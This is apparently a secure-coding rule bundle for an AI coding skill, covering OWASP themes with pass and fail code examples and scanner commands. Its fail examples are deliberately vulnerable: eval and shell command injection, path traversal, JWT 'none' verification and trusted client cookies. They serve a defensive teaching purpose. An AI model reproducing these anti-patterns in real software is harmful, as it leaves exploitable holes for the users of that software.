+<details class="entry-md-section" id="build"><summary class="entry-md-section__summary">Build</summary><div class="entry-md-section__body"><p>1. <strong>Scope the change</strong> — List trust boundaries: HTTP input, files, third-party callbacks, admin-only fields. 2. <strong>Select rules</strong> — Match story behavior to rule files (see table below). 3. <strong>Author production code</strong> — Apply DO patterns from each rule; avoid DO NOT anti-patterns. 4. <strong>Self-review (AI pass)</strong> — Re-read output against each applicable rule before scanners. 5. <strong>Run language scanners</strong> — See <strong>Validate</strong>. 6. <strong>Document residual risk</strong> — Note rules marked n/a and any manual-only controls (rate limiting, WAF, CSP headers).</p>
+<h3>Rule map (OWASP themes)</h3>
+<div class="md-table-wrap"><table class="md-table"><thead><tr><th>Prefix</th><th>Theme</th><th>Rule file</th></tr></thead><tbody><tr><td><strong>if</strong></td><td>Injection — SQL</td><td>`no-sql-string-concatenation.md`</td></tr><tr><td><strong>if</strong></td><td>Injection — OS command</td><td>`no-os-command-injection.md`</td></tr><tr><td><strong>if</strong></td><td>Injection — XSS / script</td><td>`no-dangerous-xss-sinks.md`, `no-eval-dynamic-code-execution.md`</td></tr><tr><td><strong>if</strong></td><td>Injection — LDAP</td><td>`no-ldap-filter-injection.md`</td></tr><tr><td><strong>cf</strong></td><td>Cryptographic failures</td><td>`no-plaintext-password-storage.md`, `no-plaintext-sensitive-data-at-rest.md`, `no-weak-crypto-algorithms.md`, `no-hardcoded-secrets.md`</td></tr><tr><td><strong>af</strong></td><td>Authentication failures</td><td>`no-predictable-session-token.md`, `no-insufficient-login-rate-limiting.md`, `no-client-side-auth-trust.md`, `no-jwt-none-algorithm.md`</td></tr><tr><td><strong>df</strong></td><td>Integrity / supply chain</td><td>`no-unsafe-deserialization.md`, `no-mass-assignment-from-request.md`, `no-untrusted-component-sources.md`, `no-xxe-unsafe-xml-parser.md`</td></tr><tr><td><strong>id</strong></td><td>Insecure design</td><td>`no-unsafe-file-upload-handling.md`, `no-path-traversal-in-paths.md`, `no-excessive-response-data.md`</td></tr><tr><td><strong>ec</strong></td><td>Exceptional conditions</td><td>`no-sensitive-error-disclosure.md`, `no-toctou-outside-lock.md`</td></tr><tr><td><strong>lf</strong></td><td>Logging failures</td><td>`no-secrets-in-log-output.md`, `no-missing-security-event-logging.md`</td></tr></tbody></table></div>
+<p><strong>24 rules · 72 scanners</strong> (24 stems × 3 languages). Prefix key: `context/category-index.md` and `inputs/rules-index.json`. Pattern definitions live in `scanners/common/pattern_catalog.py`; regenerate language entrypoints with `scanners/common/generate_scanners.py` after catalog edits.</p>
+<h3>Context corpus</h3>
+<p>Authoritative training material: <strong>`secure-code-warrior`</strong> repo `context/` (see `inputs/corpus-root.json` and `inputs/context-retrieval.md`). Regression fixtures live under that repo’s `fixtures/`. Use <strong>`context/green_belt_assessment/`</strong> challenges and <strong>`context/*/exercises-challenges/`</strong> when extending rules.</p>
+<hr></div></details>
+<details class="entry-md-section" id="example"><summary class="entry-md-section__summary">Example</summary><div class="entry-md-section__body"><p><strong>Story:</strong> Register customer account with email and password.</p>
+<pre><code># server/auth/register.py — secure pattern
+from argon2 import PasswordHasher
+
+_ph = PasswordHasher()
+
+
+def register_user(repo, email: str, password: str) -&gt; None:
+    if repo.find_by_email(email):
+        raise DuplicateEmailError(&quot;This email is already in use&quot;)
+    password_hash = _ph.hash(password)
+    repo.insert(email=email, password_hash=password_hash)</code></pre>
+<pre><code>// server/routes/register.js — secure pattern
+router.post(&#x27;/register&#x27;, async (req, res) =&gt; {
+  const { email, password } = registrationSchema.parse(req.body);
+  const passwordHash = await bcrypt.hash(password, 12);
+  await users.insert({ email, passwordHash });
+  res.status(201).json({ message: &#x27;Check your email to verify&#x27; });
+});</code></pre>
+<pre><code>// server/auth/RegisterService.java — secure pattern
+public void register(UserRepository repo, String email, char[] password) {
+    if (repo.findByEmail(email).isPresent()) {
+        throw new DuplicateEmailException(&quot;This email is already in use&quot;);
+    }
+    String passwordHash = passwordHasher.hash(password);
+    repo.insert(email, passwordHash);
+}</code></pre>
+<hr></div></details>
+<details class="entry-md-section" id="validate"><summary class="entry-md-section__summary">Validate</summary><div class="entry-md-section__body"><ul>
+<li>[ ] Applicable <strong>rules</strong> read; production code matches <strong>DO</strong> / avoids <strong>DO NOT</strong> examples.</li>
+<li>[ ] <strong>Scanners</strong> run for each language in scope:</li>
+</ul>
+<pre><code>$runner = &quot;&lt;engagement&gt;/.cursor/skills/execute-skill-using-skills-rules/scripts/run_scanners.py&quot;
+$skill  = &quot;&lt;engagement&gt;/.cursor/skills/abd-secure-code&quot;
+$ws     = &quot;&lt;engagement-root&gt;&quot;
+
+python $runner --skill-root $skill --workspace $ws --language python
+python $runner --skill-root $skill --workspace $ws --language javascript
+python $runner --skill-root $skill --workspace $ws --language java</code></pre>
+<ul>
+<li>[ ] <strong>`templates/secure-code-review-checklist.md`</strong> filled for the slice (or linked review artifact).</li>
+<li>[ ] <strong>`bundle_rules_into_skill_md.py`</strong> run after any `rules/*.md` edit.</li>
+<li>[ ] Residual manual items (CSP, rate limits, dependency CVEs) documented — out of scanner scope.</li>
+</ul>
+<hr>
+<p>&lt;!-- execute_rules:bundle_rules:begin --&gt;</p>
+<h3>Rule: No client-side auth trust</h3>
+<p>Authentication state must live server-side or in signed, integrity-protected tokens. Encoding user identity or roles in client-readable cookies (base64 JSON, unsigned blobs) lets attackers forge privileges (CWE-287, OWASP A07).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> keep session state in a server-side store keyed by a random, high-entropy session id.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  req.session.userId = user.id;
+  req.session.role = user.role;</code></pre>
+<ul>
+<li><strong>DO</strong> use signed (and when needed, encrypted) cookies or JWTs with verified signatures and validated claims.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  res.cookie(&#x27;session&#x27;, signedSessionId, { httpOnly: true, secure: true, signed: true });</code></pre>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> base64-encode a JSON user object into a cookie and treat it as authoritative on read.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const payload = Buffer.from(JSON.stringify({ role: user.role, id: user.id })).toString(&#x27;base64&#x27;);
+  res.cookie(&#x27;user&#x27;, payload);</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const session = JSON.parse(Buffer.from(req.cookies.user, &#x27;base64&#x27;).toString());
+  if (session.role === &#x27;admin&#x27;) { /* ... */ }</code></pre>
+<ul>
+<li><strong>DO NOT</strong> decode client cookies with `atob` / `Base64.getDecoder()` and trust embedded roles without signature verification.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  String json = new String(Base64.getDecoder().decode(request.getCookie(&quot;user&quot;).getValue()));
+  UserSession session = objectMapper.readValue(json, UserSession.class);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> accept client-supplied `isAdmin` or `role` fields without server-side authorization checks.</li>
+</ul>
+<p><strong>Example (fail):</strong> Trusting `req.body.role` on login to set persistent admin access.</p>
+<p><strong>Source:</strong> `context/07_Authentication_Failures/context/improper-authentication.md`</p>
+<h3>Rule: No dangerous XSS sinks</h3>
+<p>When untrusted content renders in a browser, use framework auto-escaping or context-appropriate encoding. APIs that treat strings as HTML or script bypass defenses and enable cross-site scripting.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> render user content through framework text nodes or escaped templates.</li>
+</ul>
+<p><strong>Example (pass):</strong> React `{userDisplayName}` in JSX — default escaping applies.</p>
+<ul>
+<li><strong>DO</strong> sanitize HTML with a maintained library (e.g. DOMPurify) when rich text is required, then assign to a controlled sink.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const clean = DOMPurify.sanitize(userHtml);
+  element.textContent = clean; // prefer textContent when HTML not required</code></pre>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> assign untrusted strings to `innerHTML`, `outerHTML`, or `dangerouslySetInnerHTML`.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  div.innerHTML = req.query.message;</code></pre>
+<ul>
+<li><strong>DO NOT</strong> disable template auto-escaping without a documented sanitization step.</li>
+</ul>
+<p><strong>Example (fail):</strong> Jinja `{{ bio | safe }}` where `bio` originates from user input.</p>
+<p><strong>Source:</strong> `context/05-injection-flaws/context/cross-site-scripting-prevention-cheat-sheet.md`</p>
+<h3>Rule: No eval or dynamic code execution</h3>
+<p>`eval`, `exec`, `Function`, and string-form `setTimeout` turn data into code. Any path that executes attacker-influenced strings is remote code execution regardless of language.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> parse structured data with `JSON.parse`, schema validators, or safe parsers — then branch on typed values.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const config = JSON.parse(raw);
+  if (typeof config.retries !== &#x27;number&#x27;) throw new ValidationError(&#x27;retries&#x27;);</code></pre>
+<ul>
+<li><strong>DO</strong> use sandboxed expression engines only when absolutely required, with strict allow-lists and no filesystem/network.</li>
+</ul>
+<p><strong>Example (pass):</strong> Dedicated rules engine library configured with a fixed function set — not `eval`.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> call `eval`, `exec`, or `new Function` on request-derived strings.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const result = eval(req.query.expression);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> pass string callbacks to timer APIs.</li>
+</ul>
+<p><strong>Example (fail):</strong> `setTimeout(&quot;updateCount(&quot; + n + &quot;)&quot;, 1000)`</p>
+<p><strong>Source:</strong> `context/05-injection-flaws/context/cross-site-scripting-prevention-cheat-sheet.md` (unsafe sinks / script execution)</p>
+<h3>Rule: No excessive response data</h3>
+<p>APIs must return only the fields the client is authorized to see. Serializing full domain entities, ORM models, or database rows exposes internal fields, PII, and secrets (CWE-200, OWASP A04).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> map domain objects to DTOs, view models, or serializers with an explicit allow-list before responding.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const user = await users.findById(req.params.id);
+  return res.json({ id: user.id, email: user.email, displayName: user.displayName });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  patient = service.get_patient(patient_id)
+  return jsonify(PatientSummary.from_entity(patient))</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  User user = userRepository.findById(id);
+  return ResponseEntity.ok(UserResponse.from(user));</code></pre>
+<ul>
+<li><strong>DO</strong> use `@JsonView`, field exclusion annotations, or schema-driven serializers when returning nested graphs.</li>
+</ul>
+<p><strong>Example (pass):</strong> Public profile endpoint returns `UserPublicView` only — no `ssn`, `passwordHash`, or internal flags.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> return the full persisted entity to HTTP clients.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const user = await User.findById(req.params.id);
+  res.json(user);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> serialize ORM `to_dict()` / `__dict__` output without filtering.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  return jsonify(user.__dict__)</code></pre>
+<ul>
+<li><strong>DO NOT</strong> send raw database rows or JPA entities in REST responses.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  return ResponseEntity.ok(userRepository.findById(id).get());</code></pre>
+<p><strong>Source:</strong> `context/06-Insecure-Design/context/sensitive-data-exposure.md`</p>
+<h3>Rule: No hardcoded secrets</h3>
+<p>Secrets, API keys, private keys, connection strings, and long-lived tokens must not live in source control. Configuration belongs in environment variables, a secret manager (Vault, AWS Secrets Manager, Azure Key Vault), or runtime injection — never as string literals in application code (CWE-798, OWASP A02).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> load secrets from environment or a secret manager at runtime; fail fast when missing.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  import os
+  stripe_key = os.environ[&quot;STRIPE_SECRET_KEY&quot;]</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const stripeKey = process.env.STRIPE_SECRET_KEY;
+  if (!stripeKey) throw new Error(&#x27;STRIPE_SECRET_KEY not configured&#x27;);</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  String dbPassword = System.getenv(&quot;DB_PASSWORD&quot;);
+  if (dbPassword == null) throw new IllegalStateException(&quot;DB_PASSWORD not configured&quot;);</code></pre>
+<ul>
+<li><strong>DO</strong> rotate credentials that were ever committed; treat the old value as compromised.</li>
+</ul>
+<p><strong>Example (pass):</strong> CI runs gitleaks/trufflehog on every pull request; pipeline fails on new secret patterns.</p>
+<ul>
+<li><strong>DO</strong> use short-lived tokens and workload identity (IAM roles, managed identities) instead of long-lived keys where the platform supports it.</li>
+</ul>
+<p><strong>Example (pass):</strong> AWS SDK uses instance/task role credentials — no static access key in code.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> assign real passwords, API keys, Stripe keys, or private key PEM blocks in source files.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  API_KEY = &quot;sk_live_EXAMPLE_KEY_DO_NOT_USE_1234567890&quot;</code></pre>
+<ul>
+<li><strong>DO NOT</strong> embed AWS access key ids, GitHub tokens, Slack tokens, or JWT signing secrets in repositories — including &quot;dev only&quot; branches.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const accessKey = &#x27;AKIAIOSFODNN7EXAMPLE&#x27;;
+  const secret = &#x27;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&#x27;;</code></pre>
+<ul>
+<li><strong>DO NOT</strong> commit database connection strings with embedded passwords.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  String url = &quot;postgresql://admin:SuperSecret@db.internal:5432/prod&quot;;</code></pre>
+<p><strong>Source:</strong> `context/04-cryotiographic-failures/context/sensitive-data-exposure.md`</p>
+<h3>Rule: No insufficient login rate limiting</h3>
+<p>Authentication endpoints must resist credential stuffing and brute force: per-IP and per-account rate limits, progressive delays, lockouts, and structured logging of failures (CWE-307, OWASP A07). A login handler with no throttling fails this rule.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> enforce rate limits and progressive backoff on login, password reset, and MFA endpoints.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  app.post(&#x27;/login&#x27;, loginRateLimiter, captchaWhenSuspicious, async (req, res) =&gt; {
+    await recordAuthAttempt({ ip: req.ip, username: req.body.email, outcome });
+  });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  @limiter.limit(&quot;5 per minute&quot;)
+  def login(request):
+      audit_log.info(&quot;auth_attempt&quot;, extra={&quot;ip&quot;: request.META[&quot;REMOTE_ADDR&quot;]})</code></pre>
+<ul>
+<li><strong>DO</strong> return generic errors (`Invalid username or password`) — same message for unknown user and bad password.</li>
+</ul>
+<p><strong>Example (pass):</strong> Single error string regardless of which check failed.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> expose login endpoints with unlimited attempts and no monitoring.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  app.post(&#x27;/login&#x27;, async (req, res) =&gt; {
+    const user = await db.findByEmail(req.body.email);
+    if (!user || !(await bcrypt.compare(req.body.password, user.hash))) {
+      return res.status(401).json({ error: &#x27;invalid&#x27; });
+    }
+  });</code></pre>
+<ul>
+<li><strong>DO NOT</strong> reveal account existence through different error messages or timing on login failure.</li>
+</ul>
+<p><strong>Example (fail):</strong> `User not found` vs `Wrong password` responses.</p>
+<p><strong>Source:</strong> `context/green_belt_assessment/e0523/challenge-3.md`, `context/07_Authentication_Failures/context/insufficient-anti-automation.md`</p>
+<h3>Rule: No JWT none algorithm</h3>
+<p>JSON Web Tokens must be verified with an explicit allow-list of strong algorithms. Accepting `alg: none`, skipping signature verification, or verifying with a null secret enables token forgery (CWE-347, OWASP A07).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> verify JWTs with HMAC-SHA256/384/512 or asymmetric algorithms (RS256, ES256) and a configured secret or public key.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: [&#x27;HS256&#x27;] });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  jwt.decode(token, key, algorithms=[&quot;RS256&quot;], audience=&quot;api.example.com&quot;)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  Jwts.parserBuilder().setSigningKey(publicKey).requireAudience(&quot;api&quot;).build().parseClaimsJws(token);</code></pre>
+<ul>
+<li><strong>DO</strong> reject tokens whose header algorithm is not on the allow-list.</li>
+</ul>
+<p><strong>Example (pass):</strong> Middleware returns 401 when `alg` is missing or not in configured algorithms.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> verify JWTs with `algorithms: [&#x27;none&#x27;]` or equivalent.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  jwt.verify(token, null, { algorithms: [&#x27;none&#x27;] });</code></pre>
+<ul>
+<li><strong>DO NOT</strong> decode JWT payload without signature verification for authentication decisions.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  payload = jwt.decode(token, options={&quot;verify_signature&quot;: False})</code></pre>
+<ul>
+<li><strong>DO NOT</strong> sign tokens with `algorithm: &#x27;none&#x27;`.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  jwt.sign({ sub: user.id }, null, { algorithm: &#x27;none&#x27; });</code></pre>
+<p><strong>Source:</strong> `context/07_Authentication_Failures/context/improper-authentication.md`</p>
+<h3>Rule: No LDAP filter injection</h3>
+<p>LDAP search filters must treat user input as data, not filter syntax. Substituting untrusted values into filter strings like `(email={0})` without RFC 4515 escaping enables filter injection — attackers can broaden queries to return all directory entries (CWE-90, OWASP A03).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> escape LDAP filter special characters (`*`, `(`, `)`, `\`, NUL) per RFC 4515 before substitution.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  String safeEmail = LdapEncoder.filterEncode(email);
+  String filter = &quot;(mail=&quot; + safeEmail + &quot;)&quot;;
+  ctx.search(baseDn, filter, controls);</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  from ldap3.utils.conv import escape_filter_chars
+  safe = escape_filter_chars(email)
+  conn.search(base, f&quot;(mail={safe})&quot;, attributes=attrs)</code></pre>
+<ul>
+<li><strong>DO</strong> use library APIs that guarantee parameterized filter escaping — verify in docs, do not assume `{0}` templates escape automatically.</li>
+</ul>
+<p><strong>Example (pass):</strong> Spring LDAP `EqualsFilter(&quot;mail&quot;, email)` builds a safe filter internally.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> pass raw user input into MessageFormat-style LDAP filters without escaping.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  ldapTemplate.search(&quot;(email=&quot; + email + &quot;)&quot;, handler);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> build LDAP filters via string concatenation with request parameters.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const filter = `(uid=${req.query.username})`;
+  client.search(baseDN, { filter });</code></pre>
+<p><strong>Source:</strong> `context/green_belt_assessment/e0523/challenge-9.md`, `context/05-injection-flaws/context/guideline-sql-injection.md` (injection family)</p>
+<h3>Rule: No mass assignment from request</h3>
+<p>HTTP request bodies are untrusted input. Blindly copying every field into persistence models lets attackers set privileged attributes (`role`, `isAdmin`, `accountVerified`) unless each update uses an explicit allow-list.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> map allowed fields explicitly from DTO to entity.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  await User.update(userId, {
+    displayName: body.displayName,
+    timezone: body.timezone,
+  });</code></pre>
+<ul>
+<li><strong>DO</strong> use schema validation (Zod, Joi, pydantic) that strips or rejects unknown keys before persistence.</li>
+</ul>
+<p><strong>Example (pass):</strong> `profileUpdateSchema.parse(req.body)` with `.strict()` or known field set.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> spread or assign entire `req.body` / `request.json` into ORM update/create.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  await User.findByIdAndUpdate(id, req.body);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> unpack request dicts into model constructors without filtering.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  User(**request.json)</code></pre>
+<ul>
+<li><strong>DO NOT</strong> bind entire request maps into entities without an allow-list.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  BeanUtils.populate(product, request.getParameterMap());</code></pre>
+<p><strong>Source:</strong> `context/08_Software_or_Data_Integrity_Failures/context/mass-assignment.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/mass-assigment-challenge.md`</p>
+<h3>Rule: No missing security event logging</h3>
+<p>Authentication and authorization outcomes must be recorded for detection and investigation. Failed logins, successful logins, logout, token issuance, and privilege changes need structured audit entries — not silent returns (CWE-778, OWASP A09).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> log authentication events with event type, actor identifier, outcome, and request correlation id — without credential material.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  if (!valid) {
+    logger.warn({ event: &#x27;login_failed&#x27;, userId: email, requestId, outcome: &#x27;invalid_password&#x27; });
+    return res.status(401).json({ error: &#x27;Invalid credentials&#x27; });
+  }
+  logger.info({ event: &#x27;login_success&#x27;, userId: user.id, requestId });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  if not verify_password(user, password):
+      logger.warning(
+          &quot;authentication_failed&quot;,
+          extra={&quot;user_id&quot;: user_id, &quot;request_id&quot;: request_id, &quot;outcome&quot;: &quot;invalid_password&quot;},
+      )
+      raise AuthenticationError(&quot;Invalid credentials&quot;)</code></pre>
+<ul>
+<li><strong>DO</strong> log authorization failures and privilege elevation with the same structured fields.</li>
+</ul>
+<p><strong>Example (pass):</strong> `audit.log(&quot;role_changed&quot;, actor=admin_id, target=user_id, new_role=&quot;support&quot;)`</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> handle login or logout without any security audit log in the handler.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  app.post(&#x27;/login&#x27;, async (req, res) =&gt; {
+    const ok = await verify(req.body.email, req.body.password);
+    res.json({ ok });
+  });</code></pre>
+<ul>
+<li><strong>DO NOT</strong> return authentication failure to the client without recording the attempt.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  if (!passwordEncoder.matches(raw, user.getPasswordHash())) {
+      return ResponseEntity.status(401).build();
+  }</code></pre>
+<ul>
+<li><strong>DO NOT</strong> rely on generic application logs that omit event type and outcome for security flows.</li>
+</ul>
+<p><strong>Example (fail):</strong> `log.debug(&quot;bad login&quot;)` with no structured security event field.</p>
+<p><strong>Source:</strong> `context/09_Logging_Alerting_Failures/context/insufficient-logging-and-monitoring.md`, `context/09_Logging_Alerting_Failures/exercises-challenges/insufficient-logging-and-monitoring-challenge.md`</p>
+<h3>Rule: No OS command injection</h3>
+<p>When code must invoke operating-system programs, pass arguments as an array without a shell intermediary. Building shell commands from user input enables metacharacter injection (`;`, `|`, `` ` ``, `$()`) — CWE-78, CWE-88, OWASP A03.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> use subprocess / spawn with an argument array and `shell=False` (default in Python 3).</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  subprocess.run([&quot;convert&quot;, input_path, output_path], check=True)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const { spawn } = require(&#x27;child_process&#x27;);
+  spawn(&#x27;ffmpeg&#x27;, [&#x27;-i&#x27;, inputPath, outputPath]);</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  new ProcessBuilder(&quot;convert&quot;, inputPath, outputPath).start();</code></pre>
+<ul>
+<li><strong>DO</strong> validate and allow-list any value that still must influence command selection (host, format enum).</li>
+</ul>
+<p><strong>Example (pass):</strong> Map `format=pdf` to internal enum before choosing converter binary — never pass raw user string as executable name.</p>
+<ul>
+<li><strong>DO</strong> run with least privilege; log command invocations without secrets.</li>
+</ul>
+<p><strong>Example (pass):</strong> Dedicated service account without shell login; audit log records argv array.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> pass user input into `shell=True` subprocess calls or shell-wrapped exec.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  subprocess.run(f&quot;grep {user_term} /var/log/app.log&quot;, shell=True)</code></pre>
+<ul>
+<li><strong>DO NOT</strong> concatenate untrusted strings into `os.system`, `child_process.exec`, or `Runtime.exec`.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  exec(&#x27;ffmpeg -i &#x27; + req.query.file);</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  Runtime.getRuntime().exec(&quot;ping &quot; + userIp);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> rely on character blacklists to &quot;sanitize&quot; shell arguments — use structured argv or avoid shell entirely.</li>
+</ul>
+<p><strong>Example (fail):</strong> Stripping `;` and `|` then passing remainder to `bash -c`.</p>
+<p><strong>Source:</strong> `context/05-injection-flaws/context/os-command-injection.md`, `context/05-injection-flaws/exercises-challenges/os-command-injection.md`</p>
+<h3>Rule: No path traversal in paths</h3>
+<p>When user input influences filesystem paths, validate and normalize before open/read/write. Traversal sequences (`../`) and absolute paths let attackers read or overwrite files outside the intended directory (CWE-22).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> resolve paths under a fixed base directory and reject if the result escapes the base.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  base = UPLOAD_ROOT.resolve()
+  target = (base / safe_filename).resolve()
+  if not str(target).startswith(str(base)):
+      raise PathTraversalError(&quot;invalid path&quot;)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const base = path.resolve(UPLOAD_DIR);
+  const target = path.resolve(base, safeName);
+  if (!target.startsWith(base + path.sep)) {
+    throw new Error(&#x27;path traversal&#x27;);
+  }</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  Path base = uploadRoot.toRealPath();
+  Path target = base.resolve(safeName).normalize();
+  if (!target.startsWith(base)) {
+      throw new SecurityException(&quot;path traversal&quot;);
+  }</code></pre>
+<ul>
+<li><strong>DO</strong> reject filenames containing path separators or `..` before mapping to storage keys.</li>
+</ul>
+<p><strong>Example (pass):</strong> Allow-list `[a-zA-Z0-9._-]+` for user-visible download ids; map to internal UUID.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> concatenate request parameters into filesystem paths without normalization.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  open(os.path.join(&quot;/data/reports&quot;, request.args[&quot;name&quot;]))</code></pre>
+<ul>
+<li><strong>DO NOT</strong> pass raw `getParameter` / `req.params` values to `File`, `Paths.get`, or `fs.readFile`.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  new File(&quot;/uploads/&quot; + request.getParameter(&quot;file&quot;));</code></pre>
+<ul>
+<li><strong>DO NOT</strong> decode `%2e%2e%2f` once and skip further validation — normalize and compare to base.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  fs.readFileSync(path.join(STORAGE, req.query.path));</code></pre>
+<p><strong>Source:</strong> `context/06-Insecure-Design/context/unrestricted-file-upload.md`, `context/05-injection-flaws/context/unrestricted-file-upload.md`</p>
+<h3>Rule: No plaintext password storage</h3>
+<p>Passwords are verifier secrets — store only adaptive password hashes with per-password salts (and optional pepper in KMS). Plaintext, reversible encryption, or fast unsalted digests of passwords fail this rule (CWE-256, OWASP A02).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> hash passwords with Argon2id (preferred), scrypt, bcrypt, or PBKDF2-HMAC-SHA256 before persistence.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  from argon2 import PasswordHasher
+  password_hash = PasswordHasher().hash(password)
+  db.save_user(email=email, password_hash=password_hash)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const passwordHash = await bcrypt.hash(password, 12);
+  await users.insert({ email, passwordHash });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  String hash = passwordEncoder.encode(rawPassword);
+  userRepository.save(new User(email, hash));</code></pre>
+<ul>
+<li><strong>DO</strong> store algorithm identifier and cost parameters with each hash for future upgrades (PHC string or structured record).</li>
+</ul>
+<p><strong>Example (pass):</strong> `$argon2id$v=19$m=47104,t=1,p=1$...` stored in `password_hash` column.</p>
+<ul>
+<li><strong>DO</strong> re-hash on successful login when work factors are below current policy.</li>
+</ul>
+<p><strong>Example (pass):</strong> After `verify`, if cost parameter is outdated, `upgrade_hash()` and persist new PHC string.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> persist the registration password field as-is from the request body.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  await User.create({ email, password: req.body.password });</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  user.setPassword(request.getParameter(&quot;password&quot;));</code></pre>
+<ul>
+<li><strong>DO NOT</strong> log or echo submitted passwords during authentication flows.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
